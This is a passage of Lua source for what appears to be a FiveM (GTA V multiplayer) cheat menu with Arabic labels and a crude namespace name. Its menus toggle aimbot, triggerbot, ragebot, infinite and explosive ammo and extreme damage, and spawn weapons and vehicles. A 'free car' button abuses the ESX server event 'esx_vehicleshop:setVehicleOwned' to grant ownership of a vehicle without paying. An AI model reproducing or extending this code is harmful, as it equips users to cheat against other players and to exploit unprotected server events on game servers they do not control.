				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2855028148)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3527687644)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1019656791)
				GiveWeaponComponentToPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1006677997)
			elseif IhadSexWithMyStepMother.Button("~r~ﺏﻮﻜﺳ ﻑﺬﺣ") then
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2637152041)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2698550338)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 2855028148)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 3527687644)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1019656791)
				RemoveWeaponComponentFromPed(PlayerPedId(), GetSelectedPedWeapon(PlayerPedId()), 1006677997)
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("weapon") then
			if IhadSexWithMyStepMother.MenuButton("ﺡﻼﺳ ﺀﺎﻄﻋﺍ", "weaponspawner") then
				selectedPlayer = PlayerId()
			elseif IhadSexWithMyStepMother.MenuButton("ﺡﻼﺴﻟﺍ ﻝﺪﻌﺗ", "WeaponCustomization") then
				selectedPlayer = PlayerId()
			elseif IhadSexWithMyStepMother.Button("ﺔﺤﻠﺳﻷﺍ ﻊﻴﻤﺟ ﺀﺎﻄﻋﺍ") then
				eW(PlayerId())
			elseif IhadSexWithMyStepMother.Button("ﺔﺤﻠﺳﻷﺍ ﻊﻴﻤﺟ ﻑﺬﺣ") then
				eQ(PlayerId())
			elseif IhadSexWithMyStepMother.Button("ﺕﺎﻘﻠﻄﻟﺍ ﻑﺬﺣ") then
				SetPedAmmo(GetPlayerPed(-1), 0)
			elseif IhadSexWithMyStepMother.Button("ﺕﺎﻘﻠﻃ ﺔﺌﺒﻌﺗ") then
				eZ(PlayerId())
			elseif IhadSexWithMyStepMother.CheckBox("ﺔﻴﺋﺎﻬﻧ ﻻ ﺕﺎﻘﻠﻃ", InfAmmo) then
				InfAmmo = not InfAmmo;
				SetPedInfiniteAmmoClip(PlayerPedId(), InfAmmo)
			elseif IhadSexWithMyStepMother.CheckBox("ﺓﺮﺠﻔﺘﻣ ﺕﺎﻘﻠﻃ", ExplosiveAmmo) then
				ExplosiveAmmo = not ExplosiveAmmo
			elseif IhadSexWithMyStepMother.CheckBox("ﺡﻼﺴﻟﺍ ﺔﻳﻮﻘﺗ", ForceGun) then
				ForceGun = not ForceGun
			elseif IhadSexWithMyStepMother.CheckBox("ﺓﺪﺣﻭ ﺔﻘﻠﻃ ﻦﻣ ﻞﺘﻗ", SuperDamage) then
				SuperDamage = not SuperDamage;
				if SuperDamage then
					local av, hy = GetCurrentPedWeapon(PlayerPedId(), 1)
					SetPlayerWeaponDamageModifier(PlayerId(), 200.0)
				else
					local av, hy = GetCurrentPedWeapon(PlayerPedId(), 1)
					SetPlayerWeaponDamageModifier(PlayerId(), 1.0)
				end
			elseif IhadSexWithMyStepMother.CheckBox("ﺔﻌﻳﺮﺳ ﺕﺎﻘﻠﻃ", RapidFire) then
				RapidFire = not RapidFire
			elseif IhadSexWithMyStepMother.CheckBox("ﺕﻮﺑ ﻢﻳﺍ", Aimbot) then
				Aimbot = not Aimbot
			elseif IhadSexWithMyStepMother.ComboBox("ﺕﻮﺑ ﻢﻳﻻﺍ ﻲﻓ ﺔﻘﻠﻄﻟﺍ ﻥﺎﻜﻣ ~y~-->", AimbotBoneOps, gr, gs, function(aD, aE)
				gr = aD;
				gs = aD;
				AimbotBone = fl(AimbotBoneOps[aD])
			end) then
			elseif IhadSexWithMyStepMother.CheckBox("ﺕﻮﺑ ﻢﻳﻷﺍ ﺓﺮﺋﺍﺩ", DrawFov) then
				DrawFov = not DrawFov
			elseif IhadSexWithMyStepMother.CheckBox("ﻲﺋﺎﻘﻠﺗ ﻞﺘﻗ", Triggerbot) then
				Triggerbot = not Triggerbot
			elseif IhadSexWithMyStepMother.CheckBox("ﺕﺎﺗﻮﺒﻟﺍ ﻞﺘﻗ", Ragebot) then
				Ragebot = not Ragebot
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("weaponspawner") then
			if IhadSexWithMyStepMother.MenuButton("ﺀﺎﻀﻴﺑ ﺔﺤﻠﺳﺃ", "melee") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺩﻭﺮﻔﻟﺍ", "pistol") then
			elseif IhadSexWithMyStepMother.MenuButton("ﻲﺟ ﻡ ﺱ", "smg") then
			elseif IhadSexWithMyStepMother.MenuButton("ﻦﻗﺍﺪﺷ", "shotgun") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺵﺎﺷﺭ", "assault") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺕﺍﺮﺒﻳﺎﻨﺳ", "sniper") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺔﻳﻭﺪﻳ ﺔﺤﻠﺳﺍ / ﺕﺍﺮﺠﻔﺘﻣ", "thrown") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺔﻠﻴﻘﺛ ﺔﺤﻠﺳﺍ", "heavy") then
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("melee") then
			for i = 1, #bU do
				if IhadSexWithMyStepMother.Button("~r~--> ~s~" .. bU[i][2] .. "") then
					eY(selectedPlayer, bU[i][1])
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("pistol") then
			for i = 1, #bW do
				if IhadSexWithMyStepMother.Button("~r~--> ~s~" .. bW[i][2] .. "") then
					eY(selectedPlayer, bW[i][1])
				elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(bW[i][1]), 0)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("smg") then
			for i = 1, #bX do
				if IhadSexWithMyStepMother.Button("~r~--> ~s~" .. bX[i][2] .. "") then
					eY(selectedPlayer, bX[i][1])
				elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(bX[i][1]), 0)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("shotgun") then
			for i = 1, #bZ do
				if IhadSexWithMyStepMother.Button("~r~--> ~s~" .. bZ[i][2] .. "") then
					eY(selectedPlayer, bZ[i][1])
				elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(bZ[i][1]), 0)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("assault") then
			for i = 1, #bY do
				if IhadSexWithMyStepMother.Button("~r~--> ~s~" .. bY[i][2] .. "") then
					eY(selectedPlayer, bY[i][1])
				elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(bY[i][1]), 0)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("sniper") then
			for i = 1, #b_ do
				if IhadSexWithMyStepMother.Button("~r~--> ~s~" .. b_[i][2] .. "") then
					eY(selectedPlayer, b_[i][1])
				elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(b_[i][1]), 0)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("thrown") then
			for i = 1, #bV do
				if IhadSexWithMyStepMother.Button("~r~--> ~s~" .. bV[i][2] .. "") then
					eY(selectedPlayer, bV[i][1])
				elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(bV[i][1]), 0)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("heavy") then
			for i = 1, #c0 do
				if IhadSexWithMyStepMother.Button("~r~--> ~s~" .. c0[i][2] .. "") then
					eY(selectedPlayer, c0[i][1])
				elseif IhadSexWithMyStepMother.Button("Remover ~b~Ammo") then
					SetPedAmmo(GetPlayerPed(-1), GetHashKey(c0[i][1]), 0)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("vehicle") then
			if IhadSexWithMyStepMother.MenuButton("ﺓﺭﺎﻴﺳ ﻦﺒﺳﺮﺗ", "vehiclespawner") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺓﺭﺎﻴﺴﻟﺍ ﻞﻳﺪﻌﺗ", "vehiclemods") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺓﺭﺎﻴﺴﻟﺍ ﻲﻓ ﻢﻜﺤﺗ", "vehiclemenu") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺓﺭﺎﻴﺴﻟﺍ ﺔﻋﺮﺳ", "VehBoostMenu") then
			elseif IhadSexWithMyStepMother.MenuButton("ﺓﺭﺎﻴﺴﻟﺍ ﺩﻮﻣ ﺩﻮﻗ", VehGodmode) then
				VehGodmode = not VehGodmode
			elseif IhadSexWithMyStepMother.ComboBox("ﺓﺭﺎﻴﺴﻟﺍ ﻦﺸﻜﻨﻓ ~r~-->", {
				"ﺓﺭﺎﻴﺴﻟﺍ ﺢﻴﻠﺼﺗ",
				"ﺓﺭﺎﻴﺴﻟﺍ ﻒﻴﻈﻨﺗ",
				"ﺓﺭﺎﻴﺴﻟﺍ ﺦﻴﺻﻮﺗ"
			}, fV, fW, function(aD, gg)
				fV = aD;
				fW = aD
			end) then
				local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
				RequestControlOnce(veh)
				if fW == 1 then
					ev(veh)
					SetVehicleEngineOn(veh, 1, 1)
				elseif fW == 2 then
					SetVehicleDirtLevel(veh, 0)
				elseif fW == 3 then
					SetVehicleDirtLevel(veh, 15.0)
				end
			elseif IhadSexWithMyStepMother.Button("ﺩﺪﺤﻤﻟﺍ ﻥﺎﻜﻤﻟﺍ ﻰﻟﺍ ﺔﻟﺎﺤﻟ ﻕﻮﺴﻳ~g~AUTO") then
				if DoesBlipExist(GetFirstBlipInfoId(8)) then
					local bB = GetBlipInfoIdIterator(8)
					local bC = GetFirstBlipInfoId(8, bB)
					local hz = Citizen.InvokeNative(18049441090438849000, bC, Citizen.ResultAsVector())
					local ped = GetPlayerPed(-1)
					ClearPedTasks(ped)
					local hA = GetVehiclePedIsIn(ped, false)
					TaskVehicleDriveToCoord(ped, hA, hz.x, hz.y, hz.z, tonumber(bS), 156, hA, 2883621, 5.5, true)
					SetDriveTaskDrivingStyle(ped, 2883621)
					speedmit = true
				end
			elseif IhadSexWithMyStepMother.Button("~r~ﺓﺍﺪﻴﻘﻟﺍ ﻑﺎﻘﻳﺍ") then
				speedmit = false;
				if IsPedInAnyVehicle(GetPlayerPed(-1)) then
					ClearPedTasks(GetPlayerPed(-1))
				else
					ClearPedTasksImmediately(GetPlayerPed(-1))
				end
			elseif IhadSexWithMyStepMother.Button("ﺎﻧﺎﺠﻣ ﺓﺭﺎﻴﺳ ﺀﺍﺮﺷ") then
				local hB = e9("Enter Vehicle Spawn Name", "", 100)
				local hC = e9("Enter Vehicle Licence Plate", "", 100)
				if hB and IsModelValid(hB) and IsModelAVehicle(hB) then
					RequestModel(hB)
					while not HasModelLoaded(hB) do
						Citizen.Wait(0)
					end;
					local veh = CreateVehicle(GetHashKey(hB), GetEntityCoords(PlayerPedId(-1)), GetEntityHeading(PlayerPedId(-1)), true, true)
					SetVehicleNumberPlateText(veh, hC)
					local cx = ESX.Game.GetVehicleProperties(veh)
					TriggerServerEvent("esx_vehicleshop:setVehicleOwned", cx)
					ShowInfo("~g~~h~Success", false)
				else
					ShowInfo("~b~~h~Model is not valid!", true)
				end
			elseif IhadSexWithMyStepMother.CheckBox("ﺖﻓﺭﺩ", driftMode) then
				driftMode = not driftMode
			elseif IhadSexWithMyStepMother.CheckBox("ﺔﺳﻮﻤﻠﻣ ﺓﺭﺎﻴﺳ", gU) then
				gU = not gU
			elseif IhadSexWithMyStepMother.ComboBoxSlider("ﺓﺭﺎﻴﺴﻟﺍ ﺔﻋﺮﺳ", SpeedModOps, gj, gk, function(aD, aE)
				gj = aD;
				gk = aD;
				SpeedModAmt = SpeedModOps[gj]
				if SpeedModAmt == 1.0 then
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0), SpeedModAmt)
				else
					SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(PlayerPedId(), 0), SpeedModAmt * 20.0)
				end
			end) then
			elseif IhadSexWithMyStepMother.CheckBox("ﺓﺭﺎﻴﺴﻟﺍ ﺕﺎﺒﺛ", EasyHandling) then
				EasyHandling = not EasyHandling;
				local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
				if not EasyHandling then
					SetVehicleGravityAmount(veh, 9.8)
				else
					SetVehicleGravityAmount(veh, 30.0)
				end
			elseif IhadSexWithMyStepMother.CheckBox("ﺕﺍﺭﺎﻴﺳ ﻦﺒﺳﺮﺗ ﺓﺭﺎﻴﺳ ﻚﻟ ﻦﺑﺮﺴﻳ", DeadlyBulldozer) then
				DeadlyBulldozer = not DeadlyBulldozer;
				if DeadlyBulldozer then
					local veh = fm("BULLDOZER", 1, fp)
					SetVehicleCanBreak(veh, not DeadlyBulldozer)
					SetVehicleCanBeVisiblyDamaged(veh, not DeadlyBulldozer)
					SetVehicleEnginePowerMultiplier(veh, 2500.0)
					SetVehicleEngineTorqueMultiplier(veh, 2500.0)
					SetVehicleEngineOn(veh, 1, 1, 1)
					SetVehicleGravityAmount(veh, 50.0)
					SetVehicleColours(veh, 27, 27)
					ShowInfo("~r~Go forth and devour thy enemies!\nPress E ~r~to launch a minion!")
				elseif not DeadlyBulldozer and IsPedInModel(PlayerPedId(), GetHashKey("BULLDOZER")) then
					DeleteVehicle(GetVehiclePedIsIn(PlayerPedId(), 0))
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("vehiclespawner") then
			if IhadSexWithMyStepMother.Button("ﻢﺳﺄﺑ ﺓﺭﺎﻴﺳ ﻦﺒﺳﺮﺗ") then
				local fn = e9("ﺓﺭﺎﻴﺴﻟﺍ ﻢﺳﺍ ﺐﺘﻛﺍ:")
				fm(fn, fo, fp)
			elseif IhadSexWithMyStepMother.CheckBox("؟ ﺓﺭﺎﻴﺴﻟﺍ ﻞﺧﺍﺩ ﻦﺒﺳﺮﺗ", fo, "ﻻ", "ﻢﻌﻧ") then
				fo = not fo
			elseif IhadSexWithMyStepMother.CheckBox("؟ ﺓﺭﺎﻴﺴﻟﺍ ﺍﺮﺑ ﻦﺒﺳﺮﺗ", ft, "ﻻ", "ﻢﻌﻧ") then
				ft = not ft
			elseif IhadSexWithMyStepMother.CheckBox("ﺔﻨﻴﻜﻤﻟﺍ ﻊﻣ ﺓﺭﺎﻴﺴﻟﺍ ﻦﺒﺳﺮﺗ : ", fp, "ﻻ", "ﻢﻌﻧ") then
				fp = not fp
			elseif IhadSexWithMyStepMother.MenuButton("Compacts", "compacts") then
			elseif IhadSexWithMyStepMother.MenuButton("Sedans", "sedans") then
			elseif IhadSexWithMyStepMother.MenuButton("SUVs", "suvs") then
			elseif IhadSexWithMyStepMother.MenuButton("Coupes", "coupes") then
			elseif IhadSexWithMyStepMother.MenuButton("Muscle", "muscle") then
			elseif IhadSexWithMyStepMother.MenuButton("Sports Classics", "sportsclassics") then
			elseif IhadSexWithMyStepMother.MenuButton("Sports", "sports") then
			elseif IhadSexWithMyStepMother.MenuButton("Super", "super") then
			elseif IhadSexWithMyStepMother.MenuButton("AmX", "AmX") then
			elseif IhadSexWithMyStepMother.MenuButton("Off-Road", "offroad") then
			elseif IhadSexWithMyStepMother.MenuButton("Industrial", "industrial") then
			elseif IhadSexWithMyStepMother.MenuButton("Utility", "utility") then
			elseif IhadSexWithMyStepMother.MenuButton("Vans", "vans") then
			elseif IhadSexWithMyStepMother.MenuButton("Cycles", "cycles") then
			elseif IhadSexWithMyStepMother.MenuButton("Boats", "boats") then
			elseif IhadSexWithMyStepMother.MenuButton("Helicopters", "helicopters") then
			elseif IhadSexWithMyStepMother.MenuButton("Planes", "planes") then
			elseif IhadSexWithMyStepMother.MenuButton("Service/Emergency/Military", "service") then
			elseif IhadSexWithMyStepMother.MenuButton("Commercial/Trains", "commercial") then
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("compacts") then
			for i = 1, #c1 do
				local fb = GetLabelText(c1[i])
				if fb == "NULL" then
					fb = c1[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(c1[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("sedans") then
			for i = 1, #c2 do
				local fb = GetLabelText(c2[i])
				if fb == "NULL" then
					fb = c2[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(c2[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("suvs") then
			for i = 1, #c3 do
				local fb = GetLabelText(c3[i])
				if fb == "NULL" then
					fb = c3[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(c3[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("coupes") then
			for i = 1, #c4 do
				local fb = GetLabelText(c4[i])
				if fb == "NULL" then
					fb = c4[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(c4[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("muscle") then
			for i = 1, #c5 do
				local fb = GetLabelText(c5[i])
				if fb == "NULL" then
					fb = c5[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(c5[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("sportsclassics") then
			for i = 1, #c6 do
				local fb = GetLabelText(c6[i])
				if fb == "NULL" then
					fb = c6[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(c6[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("sports") then
			for i = 1, #c7 do
				local fb = GetLabelText(c7[i])
				if fb == "NULL" then
					fb = c7[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(c7[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("super") then
			for i = 1, #c8 do
				local fb = GetLabelText(c8[i])
				if fb == "NULL" then
					fb = c8[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(c8[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("AmX") then
			for i = 1, #c9 do
				local fb = GetLabelText(c9[i])
				if fb == "NULL" then
					fb = c9[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(c9[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("offroad") then
			for i = 1, #ca do
				local fb = GetLabelText(ca[i])
				if fb == "NULL" then
					fb = ca[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(ca[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("industrial") then
			for i = 1, #cb do
				local fb = GetLabelText(cb[i])
				if fb == "NULL" then
					fb = cb[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(cb[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("utility") then
			for i = 1, #cc do
				local fb = GetLabelText(cc[i])
				if fb == "NULL" then
					fb = cc[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(cc[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("vans") then
			for i = 1, #cd do
				local fb = GetLabelText(cd[i])
				if fb == "NULL" then
					fb = cd[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(cd[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("cycles") then
			for i = 1, #ce do
				local fb = GetLabelText(ce[i])
				if fb == "NULL" then
					fb = ce[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(ce[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("boats") then
			for i = 1, #cf do
				local fb = GetLabelText(cf[i])
				if fb == "NULL" then
					fb = cf[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(cf[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("helicopters") then
			for i = 1, #cg do
				local fb = GetLabelText(cg[i])
				if fb == "NULL" then
					fb = cg[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(cg[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("planes") then
			for i = 1, #ch do
				local fb = GetLabelText(ch[i])
				if fb == "NULL" then
					fb = ch[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fs(ch[i], fo, ft)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("service") then
			for i = 1, #ci do
				local fb = GetLabelText(ci[i])
				if fb == "NULL" then
					fb = ci[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(ci[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("commercial") then
			for i = 1, #cj do
				local fb = GetLabelText(cj[i])
				if fb == "NULL" then
					fb = cj[i]
				end;
				local hD = IhadSexWithMyStepMother.Button(fb)
				if hD then
					fm(cj[i], fo, fp)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("vehiclemods") then
			if IhadSexWithMyStepMother.MenuButton("Vehicle Colors", "vehiclecolors") then
			elseif IhadSexWithMyStepMother.MenuButton("Tune Vehicle", "vehicletuning") then
			elseif IhadSexWithMyStepMother.Button("Set Plate Text (8 Characters)") then
				local gY = e9("Enter Plate Text (8 Characters):")
				RequestControlOnce(GetVehiclePedIsIn(PlayerPedId(), 0))
				SetVehicleNumberPlateText(GetVehiclePedIsIn(PlayerPedId(), 0), gY)
			elseif IhadSexWithMyStepMother.CheckBox("~r~R~p~a~y~i~m~n~b~b~g~o~o~w Vehicle Colour", RainbowVeh) then
				RainbowVeh = not RainbowVeh
			elseif IhadSexWithMyStepMother.CheckBox("~r~R~p~a~y~i~m~n~b~b~g~o~o~w Vehicle Neon", ou328hNeon) then
				ou328hNeon = not ou328hNeon
			elseif IhadSexWithMyStepMother.CheckBox("~r~R~p~a~y~i~m~n~b~b~g~o~o~w Sync", ou328hSync) then
				ou328hSync = not ou328hSync
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("vehiclecolors") then
			if IhadSexWithMyStepMother.MenuButton("Primary Color", "vehiclecolors_primary") then
			elseif IhadSexWithMyStepMother.MenuButton("Secondary Color", "vehiclecolors_secondary") then
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("vehiclecolors_primary") then
			if IhadSexWithMyStepMother.MenuButton("Classic Colors", "primary_classic") then
			elseif IhadSexWithMyStepMother.MenuButton("Matte Colors", "primary_matte") then
			elseif IhadSexWithMyStepMother.MenuButton("Metals", "primary_metal") then
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("vehiclecolors_secondary") then
			if IhadSexWithMyStepMother.MenuButton("Classic Colors", "secondary_classic") then
			elseif IhadSexWithMyStepMother.MenuButton("Matte Colors", "secondary_matte") then
			elseif IhadSexWithMyStepMother.MenuButton("Metals", "secondary_metal") then
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("primary_classic") then
			for i = 1, #ck do
				if IhadSexWithMyStepMother.Button(ck[i][1]) then
					local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
					local hE, hF = GetVehicleColours(veh)
					SetVehicleColours(veh, ck[i][2], hF)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("primary_matte") then
			for i = 1, #cl do
				if IhadSexWithMyStepMother.Button(cl[i][1]) then
					local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
					local hE, hF = GetVehicleColours(veh)
					SetVehicleColours(veh, cl[i][2], hF)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("primary_metal") then
			for i = 1, #cm do
				if IhadSexWithMyStepMother.Button(cm[i][1]) then
					local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
					local hE, hF = GetVehicleColours(veh)
					SetVehicleColours(veh, cm[i][2], hF)
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("secondary_classic") then
			for i = 1, #ck do
				if IhadSexWithMyStepMother.Button(ck[i][1]) then
					local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
					local hE, hF = GetVehicleColours(veh)
					SetVehicleColours(veh, hE, ck[i][2])
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("secondary_matte") then
			for i = 1, #cl do
				if IhadSexWithMyStepMother.Button(cl[i][1]) then
					local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
					local hE, hF = GetVehicleColours(veh)
					SetVehicleColours(veh, hE, cl[i][2])
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("secondary_metal") then
			for i = 1, #cm do
				if IhadSexWithMyStepMother.Button(cm[i][1]) then
					local veh = GetVehiclePedIsIn(PlayerPedId(), 0)
					local hE, hF = GetVehicleColours(veh)
					SetVehicleColours(veh, hE, cm[i][2])
				end
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("vehicletuning") then
			if IhadSexWithMyStepMother.Button("Max ~r~Exterior Tuning") then
				MaxOut(GetVehiclePedIsUsing(PlayerPedId()))
			elseif IhadSexWithMyStepMother.Button("Max ~r~Performance") then
				engine(GetVehiclePedIsUsing(PlayerPedId()))
			elseif IhadSexWithMyStepMother.Button("Max All ~r~Tuning") then
				engine1(GetVehiclePedIsUsing(PlayerPedId()))
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("VehBoostMenu") then
			if IhadSexWithMyStepMother.Button("Engine Power boost ~r~RESET") then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 1.0)
			elseif IhadSexWithMyStepMother.Button("Engine Power boost ~g~x2") then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 2.0 * 20.0)
			elseif IhadSexWithMyStepMother.Button("Engine Power boost  ~g~x4") then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 4.0 * 20.0)
			elseif IhadSexWithMyStepMother.Button("Engine Power boost  ~g~x8") then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 8.0 * 20.0)
			elseif IhadSexWithMyStepMother.Button("Engine Power boost  ~g~x16") then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 16.0 * 20.0)
			elseif IhadSexWithMyStepMother.Button("Engine Power boost  ~g~x32") then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 32.0 * 20.0)
			elseif IhadSexWithMyStepMother.Button("Engine Power boost  ~g~x64") then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 64.0 * 20.0)
			elseif IhadSexWithMyStepMother.Button("Engine Power boost  ~g~x128") then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 128.0 * 20.0)
			elseif IhadSexWithMyStepMother.Button("Engine Power boost  ~g~x512") then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 512.0 * 20.0)
			elseif IhadSexWithMyStepMother.Button("Engine Power boost  ~g~ULTIMATE") then
				SetVehicleEnginePowerMultiplier(GetVehiclePedIsIn(GetPlayerPed(-1), false), 5012.0 * 20.0)
			end
		elseif IhadSexWithMyStepMother.IsMenuOpened("vehiclemenu") then
			if IhadSexWithMyStepMother.CheckBox("Save Personal Vehicle", SavedVehicle, "None", "Saved Vehicle: " .. gM) then
				if IsPedInAnyVehicle(PlayerPedId(), 0) and not SavedVehicle then
					SavedVehicle = not SavedVehicle;
					RemoveBlip(gK)
					local bi = GetVehiclePedIsIn(PlayerPedId(), 0)
					gL = GetVehiclePedIsIn(PlayerPedId(), 0)
					gK = AddBlipForEntity(gL)
					SetBlipSprite(gK, 225)
					SetBlipColour(gK, 84)
					ShowInfo("~g~Current Vehicle Saved")
					gM = GetLabelText(GetDisplayNameFromVehicleModel(GetEntityModel(gL))) .. " " .. gL
				elseif SavedVehicle then
					SavedVehicle = not SavedVehicle;
					gL = nil;
					RemoveBlip(gK)
					ShowInfo("~b~Saved Vehicle Blip Removed")
				else
					ShowInfo("~r~You are not in a vehicle!")
				end
			elseif IhadSexWithMyStepMother.CheckBox("Left Front Door", LeftFrontDoor, "Closed", "Opened") then
				LeftFrontDoor = not LeftFrontDoor;
				local bi = GetVehiclePedIsIn(PlayerPedId(), 0)
				if LeftFrontDoor then
					SetVehicleDoorOpen(bi, 0, nil, true)
				elseif not LeftFrontDoor then
					SetVehicleDoorShut(bi, 0, true)
				end
			elseif IhadSexWithMyStepMother.CheckBox("Right Front Door", RightFrontDoor, "Closed", "Opened") then
				RightFrontDoor = not RightFrontDoor;
				local bi = GetVehiclePedIsIn(PlayerPedId(), 0)
				if RightFrontDoor then
					SetVehicleDoorOpen(bi, 1, nil, true)
				elseif not RightFrontDoor then
